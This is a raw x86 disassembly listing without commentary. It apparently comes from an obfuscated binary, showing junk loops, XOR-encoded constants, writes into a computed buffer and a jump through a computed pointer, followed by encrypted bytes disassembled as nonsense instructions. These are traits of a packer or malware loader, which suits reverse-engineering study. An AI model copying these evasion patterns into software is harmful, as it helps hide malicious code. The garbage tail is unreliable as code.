  40e715:	mov    DWORD PTR ds:0x4344b7,0x267
  40e71f:	je     0x40e741
  40e725:	adc    DWORD PTR ds:0x434547,0x43445f
  40e72f:	xor    eax,eax
  40e731:	inc    eax
  40e732:	mov    DWORD PTR ds:0x43446b,0x5274
  40e73c:	jmp    0x40f150
  40e741:	add    DWORD PTR ds:0x4344bb,ecx
  40e747:	mov    DWORD PTR [ebp-0x24],0xf89c8536
  40e74e:	and    DWORD PTR ds:0x434553,0x0
  40e758:	jmp    0x40e76a
  40e75d:	mov    edi,DWORD PTR ds:0x434553
  40e763:	inc    edi
  40e764:	mov    DWORD PTR ds:0x434553,edi
  40e76a:	cmp    DWORD PTR ds:0x434553,0x16
  40e771:	jae    0x40e855
  40e777:	cmp    DWORD PTR ds:0x434553,0xd
  40e77e:	jne    0x40e79e
  40e784:	push   0x43446b
  40e789:	push   0x6202
  40e78e:	push   0x434608
  40e793:	push   0x4346f1
  40e798:	call   DWORD PTR ds:0x413344
  40e79e:	cmp    DWORD PTR ds:0x434553,0xc
  40e7a5:	jne    0x40e7b8
  40e7ab:	mov    edi,DWORD PTR ds:0x434553
  40e7b1:	inc    edi
  40e7b2:	mov    DWORD PTR ds:0x434553,edi
  40e7b8:	jmp    0x40e75d
  40e7bd:	and    DWORD PTR ds:0x4344fb,0x0
  40e7c7:	jmp    0x40e7d9
  40e7cc:	mov    edi,DWORD PTR ds:0x4344fb
  40e7d2:	inc    edi
  40e7d3:	mov    DWORD PTR ds:0x4344fb,edi
  40e7d9:	cmp    DWORD PTR ds:0x4344fb,0x11
  40e7e0:	jae    0x40e855
  40e7e6:	cmp    DWORD PTR ds:0x4344fb,0x1c
  40e7ed:	jne    0x40e806
  40e7f3:	push   0x43479f
  40e7f8:	push   DWORD PTR [ebp-0x24]
  40e7fb:	push   0x501d
  40e800:	call   DWORD PTR ds:0x413348
  40e806:	jmp    0x40e7cc
  40e80b:	mov    DWORD PTR ds:0x4344bb,0x17
  40e815:	cmp    DWORD PTR ds:0x4344bb,0x0
  40e81c:	je     0x40e855
  40e822:	cmp    DWORD PTR ds:0x4344bb,0x24
  40e829:	jne    0x40e83d
  40e82f:	push   0x3379
  40e834:	push   DWORD PTR [ebp-0x24]
  40e837:	call   DWORD PTR ds:0x4130c8
  40e83d:	mov    ecx,DWORD PTR ds:0x4344bb
  40e843:	dec    ecx
  40e844:	mov    DWORD PTR ds:0x4344bb,ecx
  40e84a:	jmp    0x40e815
  40e84f:	sub    DWORD PTR ds:0x43450b,edx
  40e855:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  40e85c:	sbb    DWORD PTR ds:0x43453f,0x434487
  40e866:	lea    eax,[ebp-0x2c]
  40e869:	movzx  ecx,BYTE PTR ds:0x434473
  40e870:	and    ecx,DWORD PTR ds:0x43454f
  40e876:	mov    DWORD PTR ds:0x434473,ecx
  40e87c:	mov    DWORD PTR [ebp-0x18],eax
  40e87f:	mov    DWORD PTR ds:0x4344c7,0x13
  40e889:	cmp    DWORD PTR ds:0x4344c7,0x0
  40e890:	je     0x40e94f
  40e896:	cmp    DWORD PTR ds:0x4344c7,0x3
  40e89d:	jne    0x40e8b6
  40e8a3:	push   0x8243
  40e8a8:	push   0x5b51
  40e8ad:	push   DWORD PTR [ebp-0x18]
  40e8b0:	call   DWORD PTR ds:0x4130cc
  40e8b6:	cmp    DWORD PTR ds:0x4344c7,0x4
  40e8bd:	jne    0x40e8d0
  40e8c3:	mov    esi,DWORD PTR ds:0x4344c7
  40e8c9:	dec    esi
  40e8ca:	mov    DWORD PTR ds:0x4344c7,esi
  40e8d0:	xor    esi,esi
  40e8d2:	add    esi,DWORD PTR ds:0x4344c7
  40e8d8:	dec    esi
  40e8d9:	mov    DWORD PTR ds:0x4344c7,esi
  40e8df:	jmp    0x40e889
  40e8e4:	and    DWORD PTR ds:0x4344fb,0x0
  40e8ee:	jmp    0x40e900
  40e8f3:	mov    edi,DWORD PTR ds:0x4344fb
  40e8f9:	inc    edi
  40e8fa:	mov    DWORD PTR ds:0x4344fb,edi
  40e900:	cmp    DWORD PTR ds:0x4344fb,0x19
  40e907:	jae    0x40e94f
  40e90d:	cmp    DWORD PTR ds:0x4344fb,0xd
  40e914:	jne    0x40e92a
  40e91a:	push   0x6845
  40e91f:	push   0x434673
  40e924:	call   DWORD PTR ds:0x41334c
  40e92a:	cmp    DWORD PTR ds:0x4344fb,0xc
  40e931:	jne    0x40e944
  40e937:	mov    edi,DWORD PTR ds:0x4344fb
  40e93d:	inc    edi
  40e93e:	mov    DWORD PTR ds:0x4344fb,edi
  40e944:	jmp    0x40e8f3
  40e949:	sub    DWORD PTR ds:0x4344bf,edi
  40e94f:	lea    eax,[ebp-0x30]
  40e952:	mov    ecx,DWORD PTR ds:0x434507
  40e958:	adc    DWORD PTR ds:0x434537,ecx
  40e95e:	mov    DWORD PTR [ebp-0x14],eax
  40e961:	mov    esi,DWORD PTR ds:0x43449b
  40e967:	xor    ecx,ecx
  40e969:	or     ecx,DWORD PTR ds:0x4344d7
  40e96f:	sub    esi,ecx
  40e971:	or     esi,DWORD PTR [esi+ecx*1]
  40e974:	mov    eax,ds:0x414afe
  40e979:	mov    ebx,DWORD PTR ds:0x434533
  40e97f:	mov    ebx,DWORD PTR [ebx]
  40e981:	sub    DWORD PTR ds:0x43447f,ebx
  40e987:	mov    eax,DWORD PTR [eax+0x1c8]
  40e98d:	mov    eax,DWORD PTR [eax]
  40e98f:	or     edi,0x2360
  40e995:	mov    ecx,DWORD PTR [ebp-0x14]
  40e998:	mov    esi,0x7510851
  40e99d:	and    DWORD PTR ds:0x4344c7,0x6472
  40e9a7:	xor    eax,esi
  40e9a9:	sbb    edi,DWORD PTR ds:0x43447b
  40e9af:	mov    edi,0x327299
  40e9b4:	xor    DWORD PTR ds:0x43447b,ebx
  40e9ba:	add    eax,edi
  40e9bc:	mov    DWORD PTR [ecx],eax
  40e9be:	mov    eax,ds:0x414dae
  40e9c3:	movzx  ebx,WORD PTR ds:0x434577
  40e9ca:	cmp    eax,0x22c02f45
  40e9cf:	mov    eax,DWORD PTR [ebp-0x4]
  40e9d2:	movzx  ebx,BYTE PTR ds:0x434547
  40e9d9:	mov    ebx,0xf89c853a
  40e9de:	je     0x40ea1a
  40e9e4:	sub    DWORD PTR ds:0x43457f,edi
  40e9ea:	mov    ecx,DWORD PTR [ebp-0x24]
  40e9ed:	xor    eax,esi
  40e9ef:	add    eax,edi
  40e9f1:	sbb    DWORD PTR ds:0x434583,0x3fff
  40e9fb:	imul   eax,ecx
  40e9fe:	mov    DWORD PTR ds:0x434477,0x22e4
  40ea08:	mov    DWORD PTR [ebp-0x24],eax
  40ea0b:	mov    DWORD PTR ds:0x4344c7,0x3208
  40ea15:	jmp    0x40eab6
  40ea1a:	add    DWORD PTR ds:0x43453f,0x154a
  40ea24:	xor    eax,esi
  40ea26:	sbb    DWORD PTR ds:0x4344c7,0x7bc1
  40ea30:	add    eax,edi
  40ea32:	mov    ds:0x414c12,eax
  40ea37:	movzx  eax,BYTE PTR ds:0x43453b
  40ea3e:	sub    DWORD PTR ds:0x43453f,eax
  40ea44:	mov    eax,DWORD PTR [ebp-0x24]
  40ea47:	xor    eax,esi
  40ea49:	adc    DWORD PTR ds:0x43450f,ebx
  40ea4f:	add    eax,edi
  40ea51:	not    ecx
  40ea53:	mov    ds:0x414dae,eax
  40ea58:	mov    eax,DWORD PTR [ebp-0x4]
  40ea5b:	mov    ecx,DWORD PTR ds:0x414c12
  40ea61:	xor    eax,esi
  40ea63:	xor    DWORD PTR ds:0x434483,0x434543
  40ea6d:	add    eax,edi
  40ea6f:	mov    DWORD PTR ds:0x43450b,0x4a46
  40ea79:	cmp    ecx,eax
  40ea7b:	jne    0x40eab6
  40ea81:	sbb    DWORD PTR ds:0x434483,0x4344cf
  40ea8b:	push   ebx
  40ea8c:	mov    DWORD PTR ds:0x43453f,0x49e8
  40ea96:	push   DWORD PTR [ebp-0x4]
  40ea99:	sbb    DWORD PTR ds:0x4344bf,0x7dd1
  40eaa3:	push   DWORD PTR [ebp-0x24]
  40eaa6:	adc    DWORD PTR ds:0x43446f,0x434483
  40eab0:	call   DWORD PTR ds:0x414c0a
  40eab6:	and    edx,DWORD PTR ds:0x434483
  40eabc:	mov    eax,ds:0x414afe
  40eac1:	mov    ecx,DWORD PTR ds:0x434513
  40eac7:	and    DWORD PTR ds:0x4344c3,ecx
  40eacd:	mov    eax,DWORD PTR [eax+0x18c]
  40ead3:	sub    ecx,edx
  40ead5:	mov    eax,DWORD PTR [eax]
  40ead7:	neg    ecx
  40ead9:	mov    DWORD PTR [ebp-0x44],eax
  40eadc:	mov    DWORD PTR [ebp-0x10],ebx
  40eadf:	sub    ecx,DWORD PTR ds:0x43458f
  40eae5:	mov    DWORD PTR [ebp-0x10],ebx
  40eae8:	and    DWORD PTR ds:0x4344bf,0x0
  40eaf2:	jmp    0x40eb04
  40eaf7:	mov    ecx,DWORD PTR ds:0x4344bf
  40eafd:	inc    ecx
  40eafe:	mov    DWORD PTR ds:0x4344bf,ecx
  40eb04:	cmp    DWORD PTR ds:0x4344bf,0x1d
  40eb0b:	jae    0x40eb61
  40eb11:	cmp    DWORD PTR ds:0x4344bf,0x7
  40eb18:	jne    0x40eb2c
  40eb1e:	push   DWORD PTR [ebp-0x18]
  40eb21:	push   0x7577
  40eb26:	call   DWORD PTR ds:0x4130d0
  40eb2c:	cmp    DWORD PTR ds:0x4344bf,0x6
  40eb33:	jne    0x40eb48
  40eb39:	xor    ecx,ecx
  40eb3b:	add    ecx,DWORD PTR ds:0x4344bf
  40eb41:	inc    ecx
  40eb42:	mov    DWORD PTR ds:0x4344bf,ecx
  40eb48:	jmp    0x40eaf7
  40eb4d:	xor    edx,edx
  40eb4f:	or     edx,DWORD PTR ds:0x4344c7
  40eb55:	sbb    edx,DWORD PTR ds:0x434587
  40eb5b:	mov    DWORD PTR ds:0x4344c7,edx
  40eb61:	mov    DWORD PTR [ebp-0x10],ebx
  40eb64:	mov    ecx,DWORD PTR ds:0x43458b
  40eb6a:	or     DWORD PTR ds:0x43453b,ecx
  40eb70:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  40eb77:	or     eax,edx
  40eb79:	mov    DWORD PTR [ebp-0x10],ebx
  40eb7c:	mov    DWORD PTR [ebp-0x10],0xf89c853e
  40eb83:	xor    ecx,DWORD PTR ds:0x4344b7
  40eb89:	mov    eax,DWORD PTR [ebp-0x24]
  40eb8c:	and    edx,0x522c
  40eb92:	mov    ecx,DWORD PTR [ebp-0x4]
  40eb95:	and    DWORD PTR ds:0x43458f,edx
  40eb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40eb9e:	or     DWORD PTR ds:0x43458b,0x434547
  40eba8:	xor    edx,esi
  40ebaa:	sub    DWORD PTR ds:0x4344cf,0x434487
  40ebb4:	xor    ecx,esi
  40ebb6:	adc    DWORD PTR ds:0x43453f,0x43457b
  40ebc0:	add    ecx,edx
  40ebc2:	mov    edx,DWORD PTR [ebp-0x4]
  40ebc5:	adc    DWORD PTR ds:0x434477,0x4344f7
  40ebcf:	xor    eax,esi
  40ebd1:	xor    edx,esi
  40ebd3:	adc    DWORD PTR ds:0x434463,0x6faf
  40ebdd:	add    eax,edi
  40ebdf:	mov    DWORD PTR ds:0x434503,0x13
  40ebe9:	lea    ecx,[ecx+edx*1+0x9757cb]
  40ebf0:	mov    DWORD PTR ds:0x4344bb,0x74ca
  40ebfa:	mov    DWORD PTR [ebp-0x20],eax
  40ebfd:	mov    DWORD PTR ds:0x4344c3,0x777a
  40ec07:	cmp    eax,ecx
  40ec09:	mov    DWORD PTR ds:0x434593,0x6f86
  40ec13:	ja     0x40ed7b
  40ec19:	jmp    0x40ec27
  40ec1e:	adc    DWORD PTR ds:0x4344fb,edi
  40ec24:	mov    eax,DWORD PTR [ebp-0x20]
  40ec27:	add    DWORD PTR ds:0x434583,0x32bd
  40ec31:	mov    ecx,DWORD PTR [ebp-0x4]
  40ec34:	xor    ecx,esi
  40ec36:	xor    DWORD PTR ds:0x434467,0x43450f
  40ec40:	lea    eax,[ecx+eax*1+0x327299]
  40ec47:	push   eax
  40ec48:	and    DWORD PTR ds:0x434513,0x0
  40ec52:	xor    eax,eax
  40ec54:	or     eax,DWORD PTR ds:0x434513
  40ec5a:	inc    eax
  40ec5b:	mov    ds:0x434513,eax
  40ec60:	cmp    DWORD PTR ds:0x434513,0x10
  40ec67:	jne    0x40ec76
  40ec6d:	push   DWORD PTR [ebp-0x1c]
  40ec70:	call   DWORD PTR ds:0x413350
  40ec76:	cmp    DWORD PTR ds:0x434513,0xf
  40ec7d:	jne    0x40ec91
  40ec83:	xor    eax,eax
  40ec85:	add    eax,DWORD PTR ds:0x434513
  40ec8b:	inc    eax
  40ec8c:	mov    ds:0x434513,eax
  40ec91:	cmp    DWORD PTR ds:0x434513,0x1c
  40ec98:	jb     0x40ec52
  40ec9e:	movzx  eax,BYTE PTR ds:0x434463
  40eca5:	adc    eax,DWORD PTR ds:0x4344fb
  40ecab:	mov    ds:0x434463,eax
  40ecb0:	mov    eax,DWORD PTR [ebp-0x14]
  40ecb3:	xor    eax,esi
  40ecb5:	mov    DWORD PTR ds:0x4344bf,0x3b17
  40ecbf:	lea    eax,[ebp+eax*1+0x3272a1]
  40ecc6:	sub    DWORD PTR ds:0x434577,0x434483
  40ecd0:	push   eax
  40ecd1:	and    eax,DWORD PTR ds:0x4344fb
  40ecd7:	mov    eax,ds:0x414afe
  40ecdc:	adc    DWORD PTR ds:0x4344b7,0x7c2
  40ece6:	push   DWORD PTR [eax+0x1bc]
  40ecec:	call   0x4028d7
  40ecf1:	mov    eax,DWORD PTR [ebp-0x4]
  40ecf4:	mov    ecx,DWORD PTR [ebp-0x20]
  40ecf7:	mov    edx,DWORD PTR ds:0x43457b
  40ecfd:	or     DWORD PTR ds:0x434593,edx
  40ed03:	xor    eax,esi
  40ed05:	lea    eax,[ecx+eax*1+0x327299]
  40ed0c:	mov    ecx,DWORD PTR [ebp-0x4]
  40ed0f:	or     DWORD PTR ds:0x4344c3,edi
  40ed15:	mov    edx,DWORD PTR [ebp-0x4]
  40ed18:	sub    DWORD PTR ds:0x4344f7,0x283f
  40ed22:	xor    edx,esi
  40ed24:	xor    DWORD PTR ds:0x434553,0x4344b7
  40ed2e:	xor    ecx,esi
  40ed30:	add    ecx,edx
  40ed32:	mov    edx,DWORD PTR [ebp-0x4]
  40ed35:	and    DWORD PTR ds:0x434577,0x43447f
  40ed3f:	xor    edx,esi
  40ed41:	mov    DWORD PTR ds:0x4344b7,0x5401
  40ed4b:	lea    ecx,[ecx+edx*1+0x9757cb]
  40ed52:	mov    DWORD PTR ds:0x434487,0x25c8
  40ed5c:	mov    DWORD PTR [ebp-0x20],eax
  40ed5f:	mov    DWORD PTR ds:0x4344bf,0x56d4
  40ed69:	cmp    eax,ecx
  40ed6b:	mov    DWORD PTR ds:0x434487,0x74b6
  40ed75:	jbe    0x40ec1e
  40ed7b:	mov    DWORD PTR ds:0x43457f,0x4be2
  40ed85:	mov    eax,DWORD PTR [ebp+0xc]
  40ed88:	add    DWORD PTR ds:0x434587,edx
  40ed8e:	mov    ds:0x414982,eax
  40ed93:	mov    eax,DWORD PTR [ebp+0x10]
  40ed96:	mov    ds:0x414bd6,eax
  40ed9b:	and    DWORD PTR ds:0x434547,0x0
  40eda5:	mov    ecx,DWORD PTR ds:0x434547
  40edab:	inc    ecx
  40edac:	mov    DWORD PTR ds:0x434547,ecx
  40edb2:	cmp    DWORD PTR ds:0x434547,0x1f
  40edb9:	jne    0x40edca
  40edbf:	push   0x4347db
  40edc4:	call   DWORD PTR ds:0x413354
  40edca:	cmp    DWORD PTR ds:0x434547,0x13
  40edd1:	jb     0x40eda5
  40edd7:	add    ecx,eax
  40edd9:	mov    eax,ds:0x414982
  40edde:	inc    ecx
  40eddf:	mov    ecx,DWORD PTR [ebp-0x18]
  40ede2:	sub    DWORD PTR ds:0x4344cf,0x1b10
  40edec:	push   DWORD PTR [ebp-0x44]
  40edef:	or     DWORD PTR ds:0x434543,0x434577
  40edf9:	sub    eax,edi
  40edfb:	sub    DWORD PTR ds:0x43447f,0x43446f
  40ee05:	push   DWORD PTR [ebp-0x30]
  40ee08:	adc    DWORD PTR ds:0x4344bb,0x5064
  40ee12:	xor    eax,esi
  40ee14:	mov    DWORD PTR [ecx],eax
  40ee16:	push   DWORD PTR [ebp-0x2c]
  40ee19:	call   0x40f157
  40ee1e:	sub    eax,edi
  40ee20:	adc    ecx,DWORD PTR ds:0x43446f
  40ee26:	xor    eax,esi
  40ee28:	mov    DWORD PTR ds:0x43447f,0x13
  40ee32:	cmp    DWORD PTR ds:0x43447f,0x0
  40ee39:	je     0x40ee7a
  40ee3f:	cmp    DWORD PTR ds:0x43447f,0x18
  40ee46:	jne    0x40ee68
  40ee4c:	push   0x4347db
  40ee51:	push   DWORD PTR [ebp-0xc]
  40ee54:	push   DWORD PTR [ebp-0x28]
  40ee57:	push   DWORD PTR [ebp-0x1c]
  40ee5a:	push   DWORD PTR [ebp-0x20]
  40ee5d:	push   0x2408
  40ee62:	call   DWORD PTR ds:0x413358
  40ee68:	mov    ecx,DWORD PTR ds:0x43447f
  40ee6e:	dec    ecx
  40ee6f:	mov    DWORD PTR ds:0x43447f,ecx
  40ee75:	jmp    0x40ee32
  40ee7a:	mov    DWORD PTR [ebp+0xc],eax
  40ee7d:	mov    ecx,DWORD PTR [ebp-0x4]
  40ee80:	mov    eax,DWORD PTR [ebp+0xc]
  40ee83:	xor    ecx,esi
  40ee85:	add    ecx,edi
  40ee87:	xor    edx,edx
  40ee89:	div    ecx
  40ee8b:	mov    ecx,DWORD PTR [ebp-0x24]
  40ee8e:	cmp    ecx,eax
  40ee90:	jne    0x40f0b9
  40ee96:	mov    eax,ds:0x414afe
  40ee9b:	mov    DWORD PTR [ebp+0x10],eax
  40ee9e:	mov    eax,ds:0x414c0e
  40eea3:	mov    DWORD PTR [ebp-0x50],eax
  40eea6:	mov    DWORD PTR [ebp-0x18],0xf89c8536
  40eead:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40eeb4:	mov    DWORD PTR [ebp-0x4c],0xf89cb536
  40eebb:	mov    DWORD PTR [ebp-0x64],0xf89f0536
  40eec2:	mov    DWORD PTR [ebp-0x60],0xf89c85f6
  40eec9:	mov    DWORD PTR [ebp-0x54],0xf89c85d6
  40eed0:	mov    eax,DWORD PTR [ebp-0x18]
  40eed3:	xor    eax,esi
  40eed5:	add    eax,edi
  40eed7:	mov    DWORD PTR [ebp-0xc],eax
  40eeda:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  40eee1:	mov    BYTE PTR [ebp-0x25],0x67
  40eee5:	mov    eax,DWORD PTR [ebp-0x18]
  40eee8:	xor    eax,esi
  40eeea:	add    eax,edi
  40eeec:	mov    DWORD PTR [ebp-0xc],eax
  40eeef:	mov    eax,DWORD PTR [ebp-0x54]
  40eef2:	xor    eax,esi
  40eef4:	add    eax,edi
  40eef6:	mov    DWORD PTR [ebp-0x40],eax
  40eef9:	mov    eax,DWORD PTR [ebp-0x4c]
  40eefc:	xor    eax,esi
  40eefe:	add    eax,edi
  40ef00:	mov    DWORD PTR [ebp-0x38],eax
  40ef03:	mov    eax,DWORD PTR [ebp-0x3c]
  40ef06:	xor    eax,esi
  40ef08:	add    eax,edi
  40ef0a:	mov    DWORD PTR [ebp-0x34],eax
  40ef0d:	lea    eax,[ebp-0xa8]
  40ef13:	mov    DWORD PTR [ebp+0xc],eax
  40ef16:	mov    eax,DWORD PTR [ebp-0x18]
  40ef19:	mov    DWORD PTR [ebp-0x14],eax
  40ef1c:	mov    eax,DWORD PTR [ebp-0x20]
  40ef1f:	mov    DWORD PTR [ebp-0x5c],ebx
  40ef22:	mov    DWORD PTR [ebp-0x10],eax
  40ef25:	mov    eax,DWORD PTR [ebp-0x5c]
  40ef28:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef2b:	xor    eax,esi
  40ef2d:	add    eax,0x327299
  40ef32:	mov    DWORD PTR [ecx],eax
  40ef34:	mov    eax,DWORD PTR [ebp-0x14]
  40ef37:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef3a:	xor    eax,esi
  40ef3c:	add    eax,edi
  40ef3e:	mov    DWORD PTR [ecx+0x4],eax
  40ef41:	mov    eax,DWORD PTR [ebp-0x34]
  40ef44:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef47:	mov    DWORD PTR [ecx+0x8],eax
  40ef4a:	mov    eax,DWORD PTR [ebp-0x38]
  40ef4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef50:	mov    DWORD PTR [ecx+0xc],eax
  40ef53:	mov    eax,DWORD PTR [ebp-0x40]
  40ef56:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef59:	mov    DWORD PTR [ecx+0x10],eax
  40ef5c:	mov    eax,eax
  40ef5e:	mov    eax,DWORD PTR [ebp-0x10]
  40ef61:	xor    eax,esi
  40ef63:	add    eax,edi
  40ef65:	je     0x40ef96
  40ef6b:	lea    eax,[ebp-0xa8]
  40ef71:	push   eax
  40ef72:	mov    eax,DWORD PTR [ebp-0x20]
  40ef75:	xor    eax,esi
  40ef77:	add    eax,edi
  40ef79:	push   eax
  40ef7a:	mov    eax,DWORD PTR [ebp+0x10]
  40ef7d:	add    eax,0xaa
  40ef82:	push   eax
  40ef83:	mov    eax,DWORD PTR [ebp+0x10]
  40ef86:	mov    eax,DWORD PTR [eax+0x198]
  40ef8c:	push   DWORD PTR [eax]
  40ef8e:	call   0x411333
  40ef93:	mov    DWORD PTR [ebp-0x8],eax
  40ef96:	cmp    DWORD PTR [ebp-0x8],0x0
  40ef9a:	je     0x40f0b9
  40efa0:	lea    eax,[ebp-0xc]
  40efa3:	mov    DWORD PTR [ebp-0x38],eax
  40efa6:	mov    eax,DWORD PTR [ebp-0x60]
  40efa9:	xor    eax,esi
  40efab:	add    eax,edi
  40efad:	mov    DWORD PTR [ebp-0x40],eax
  40efb0:	mov    eax,DWORD PTR [ebp-0x3c]
  40efb3:	xor    eax,esi
  40efb5:	add    eax,edi
  40efb7:	mov    DWORD PTR [ebp-0x10],eax
  40efba:	mov    eax,DWORD PTR [ebp-0x8]
  40efbd:	mov    DWORD PTR [ebp-0x14],eax
  40efc0:	lea    eax,[ebp-0xa8]
  40efc6:	mov    DWORD PTR [ebp+0xc],eax
  40efc9:	mov    eax,DWORD PTR [ebp-0x18]
  40efcc:	mov    DWORD PTR [ebp-0x18],eax
  40efcf:	mov    eax,DWORD PTR [ebp-0x20]
  40efd2:	mov    DWORD PTR [ebp-0x48],ebx
  40efd5:	mov    DWORD PTR [ebp-0x34],eax
  40efd8:	mov    eax,DWORD PTR [ebp-0x48]
  40efdb:	mov    ecx,DWORD PTR [ebp+0xc]
  40efde:	xor    eax,esi
  40efe0:	add    eax,0x327299
  40efe5:	mov    DWORD PTR [ecx],eax
  40efe7:	mov    eax,DWORD PTR [ebp-0x14]
  40efea:	mov    ecx,DWORD PTR [ebp+0xc]
  40efed:	mov    DWORD PTR [ecx+0x4],eax
  40eff0:	mov    eax,DWORD PTR [ebp-0x10]
  40eff3:	mov    ecx,DWORD PTR [ebp+0xc]
  40eff6:	mov    DWORD PTR [ecx+0x8],eax
  40eff9:	mov    eax,DWORD PTR [ebp-0x40]
  40effc:	mov    ecx,DWORD PTR [ebp+0xc]
  40efff:	mov    DWORD PTR [ecx+0xc],eax
  40f002:	mov    eax,DWORD PTR [ebp-0x38]
  40f005:	mov    ecx,DWORD PTR [ebp+0xc]
  40f008:	mov    DWORD PTR [ecx+0x10],eax
  40f00b:	mov    eax,eax
  40f00d:	mov    eax,DWORD PTR [ebp-0x14]
  40f010:	test   eax,eax
  40f012:	mov    eax,DWORD PTR [ebp-0x34]
  40f015:	jne    0x40f01e
  40f01b:	mov    eax,DWORD PTR [ebp-0x18]
  40f01e:	xor    eax,esi
  40f020:	add    eax,edi
  40f022:	test   eax,eax
  40f024:	je     0x40f052
  40f02a:	lea    eax,[ebp-0xa8]
  40f030:	push   eax
  40f031:	mov    eax,DWORD PTR [ebp-0x20]
  40f034:	xor    eax,esi
  40f036:	add    eax,edi
  40f038:	push   eax
  40f039:	mov    eax,DWORD PTR [ebp+0x10]
  40f03c:	add    eax,0xee
  40f041:	push   eax
  40f042:	mov    eax,DWORD PTR [ebp+0x10]
  40f045:	mov    eax,DWORD PTR [eax+0x198]
  40f04b:	push   DWORD PTR [eax]
  40f04d:	call   0x411333
  40f052:	mov    ecx,DWORD PTR [ebp-0x3c]
  40f055:	xor    ecx,esi
  40f057:	mov    eax,0xffcd8d67
  40f05c:	sub    eax,ecx
  40f05e:	sub    eax,DWORD PTR [ebp-0x8]
  40f061:	mov    ecx,DWORD PTR [ebp-0x50]
  40f064:	add    ecx,eax
  40f066:	mov    eax,DWORD PTR [ebp-0x8]
  40f069:	mov    DWORD PTR [eax+0x1],ecx
  40f06c:	mov    al,BYTE PTR [ebp-0x25]
  40f06f:	mov    ecx,DWORD PTR [ebp-0x8]
  40f072:	xor    al,0x44
  40f074:	sub    al,0x3a
  40f076:	mov    BYTE PTR [ecx],al
  40f078:	lea    eax,[ebp-0x8]
  40f07b:	inc    BYTE PTR [eax]
  40f07d:	inc    eax
  40f07e:	push   eax
  40f07f:	pop    ecx
  40f080:	dec    ecx
  40f081:	xchg   ecx,edx
  40f083:	dec    BYTE PTR [edx]
  40f085:	push   DWORD PTR [ebp+0x10]
  40f088:	mov    eax,ds:0x414bba
  40f08d:	mov    eax,DWORD PTR [eax]
  40f08f:	push   DWORD PTR [eax]
  40f091:	lea    eax,ds:0x414bd6
  40f097:	push   DWORD PTR [eax]
  40f099:	lea    eax,ds:0x414982
  40f09f:	push   DWORD PTR [eax]
  40f0a1:	lea    eax,ds:0x414bb6
  40f0a7:	push   DWORD PTR [eax]
  40f0a9:	lea    eax,ds:0x414cda
  40f0af:	push   DWORD PTR [eax]
  40f0b1:	xchg   ebx,edx
  40f0b3:	inc    ebx
  40f0b4:	push   ebx
  40f0b5:	pop    eax
  40f0b6:	call   DWORD PTR [eax-0x1]
  40f0b9:	lea    eax,[ebp+0x4]
  40f0bc:	mov    DWORD PTR [ebp-0x58],eax
  40f0bf:	mov    eax,ds:0x414afe
  40f0c4:	push   0x4
  40f0c6:	add    eax,0x1cc
  40f0cb:	push   eax
  40f0cc:	lea    eax,[ebp-0x1c]
  40f0cf:	push   eax
  40f0d0:	call   0x4028d7
  40f0d5:	mov    eax,DWORD PTR [ebp-0x1c]
  40f0d8:	mov    eax,DWORD PTR [ebp-0x4]
  40f0db:	mov    eax,DWORD PTR [ebp-0x24]
  40f0de:	mov    DWORD PTR [ebp+0xc],eax
  40f0e1:	mov    eax,ds:0x414b82
  40f0e6:	mov    ecx,DWORD PTR [ebp+0xc]
  40f0e9:	sub    eax,edi
  40f0eb:	xor    eax,esi
  40f0ed:	cmp    eax,ecx
  40f0ef:	je     0x40f136
  40f0f5:	mov    eax,ds:0x414b7a
  40f0fa:	mov    ecx,DWORD PTR [ebp+0xc]
  40f0fd:	sub    eax,edi
  40f0ff:	xor    eax,esi
  40f101:	cmp    eax,ecx
  40f103:	jne    0x40f119
  40f109:	mov    eax,ds:0x414b82
  40f10e:	add    eax,DWORD PTR ds:0x414b7a
  40f114:	jmp    0x40f120
  40f119:	mov    eax,DWORD PTR [ebp+0xc]
  40f11c:	xor    eax,esi
  40f11e:	add    eax,edi
  40f120:	mov    ds:0x414b7a,eax
  40f125:	mov    eax,DWORD PTR [ebp+0xc]
  40f128:	xor    eax,esi
  40f12a:	add    eax,edi
  40f12c:	mov    ds:0x414b82,eax
  40f131:	jmp    0x40f140
  40f136:	mov    eax,ds:0x414b82
  40f13b:	mov    ds:0x414b7a,eax
  40f140:	mov    eax,DWORD PTR [ebp-0x58]
  40f143:	mov    ecx,DWORD PTR ds:0x414b7a
  40f149:	add    DWORD PTR [eax],ecx
  40f14b:	mov    eax,DWORD PTR [ebp-0x1c]
  40f14e:	mov    eax,DWORD PTR [eax]
  40f150:	pop    edi
  40f151:	pop    esi
  40f152:	pop    ebx
  40f153:	leave  
  40f154:	ret    0xc
  40f157:	push   ebp
  40f158:	mov    ebp,esp
  40f15a:	jmp    0x40f4ed
  40f15f:	repz call 0x655e557a
  40f165:	jae    0x40f1d8
  40f167:	hlt    
  40f168:	aaa    
  40f169:	scas   eax,DWORD PTR es:[edi]
  40f16a:	aad    0x40
  40f16c:	mov    eax,0xb620c558
  40f171:	jle    0x40f1f1
  40f173:	hlt    
  40f174:	jns    0x40f1f4
  40f176:	jle    0x40f160
  40f178:	les    esi,FWORD PTR [edi]
  40f17a:	pop    ds
  40f17b:	push   ecx
  40f17c:	jns    0x40f1ec
  40f17e:	sub    eax,esp
  40f180:	xchg   ebx,eax
  40f181:	or     eax,0x87370429
  40f186:	fdivr  st,st(2)
  40f188:	ss or  eax,0x1bcac258
  40f18e:	jbe    0x40f14f
  40f190:	sbb    eax,0xb8150183
  40f195:	cld    
  40f196:	(bad)  
  40f197:	xor    DWORD PTR [edx+eiz*1-0x349e6f6b],ebx
  40f19e:	lds    esi,FWORD PTR [edx-0x4bab3e6d]
  40f1a4:	(bad)  
  40f1a6:	adc    bh,bl
  40f1a8:	ins    BYTE PTR es:[edi],dx
  40f1a9:	pop    eax
  40f1aa:	or     DWORD PTR [ecx-0x1f9672fe],esi
  40f1b0:	jbe    0x40f17f
  40f1b2:	aas    
  40f1b3:	push   es
  40f1b4:	pop    esi
  40f1b5:	pop    ds
  40f1b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1b7:	out    dx,eax
